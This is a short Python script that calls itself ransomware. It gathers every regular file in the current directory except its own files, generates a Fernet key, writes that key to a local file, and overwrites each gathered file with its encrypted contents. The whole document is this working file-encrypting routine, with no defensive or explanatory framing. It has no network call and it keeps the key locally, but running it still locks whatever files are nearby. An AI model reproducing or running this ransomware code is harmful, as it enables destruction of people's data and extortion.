import os
from cryptography.fernet import Fernet

file_list = []

def getting_files(): #get files except our ransomware and folders
    global file_list
    for file in os.listdir():
        if file == "ransom.py" or file == "ransomkey.key" or file == "ransomdecoder.py":
            continue
        elif os.path.isfile(file):
            file_list.append(file)
            print(str(file) + "added to list")



def encoding_files(file_list, key):  #encode files with fernet
    for file in file_list:
        with open(file, "rb") as encoding_file:
            content = encoding_file.read()
        encrypted_content = Fernet(key).encrypt(content)
        with open(file, "wb") as encoding_file:
            encoding_file.write(encrypted_content)

def generating_key(): # generate key to encrypt and decrypt files, this part creates a file to store the key
    key = Fernet.generate_key()
    with open("ransomkey.key", "wb") as generated_key:
        generated_key.write(key)
    return key


def __main__():
    global file_list
    getting_files()
    print(file_list)
    key = generating_key()
    encoding_files(file_list, key)

__main__()